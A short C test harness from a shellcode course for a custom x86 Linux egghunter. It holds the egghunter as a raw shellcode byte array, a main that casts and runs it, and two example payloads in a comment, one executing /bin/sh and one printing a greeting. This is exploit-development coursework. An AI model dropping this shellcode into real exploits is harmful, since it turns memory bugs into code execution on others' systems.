/*
Author: Marco Lugo (SLAE-1031)

Program created to test a custom egghunter

Examples:

a) Run /bin/sh:
./program "$(printf "blahblah\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80")"
b) Will echo "Hello, my name is egg"
./program "$(printf "blahblah\xeb\x19\x31\xc0\xb0\x04\x31\xdb\xb3\x01\x59\x31\xd2\xb2\x16\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xb3\x01\xcd\x80\xe8\xe2\xff\xff\xff\x48\x65\x6c\x6c\x6f\x2c\x20\x6d\x79\x20\x6e\x61\x6d\x65\x20\x69\x73\x20\x65\x67\x67\x20")"
*/

#include <stdio.h>
#include <string.h>
#include <unistd.h>

unsigned char egghunter[] = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8\x62\x6c\x61\x68\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7";

int main(int argc, char **argv){

        printf("[+] Executing egghunter in 3 seconds...\n");
        sleep(3);
        printf("[+] Starting memory search, if successful, the shellcode passed as the first argument will be executed...\n");
        int (*egg)() = (int(*)())egghunter;
        egg();
        printf("[-] Failed.\n");
return(0);
}
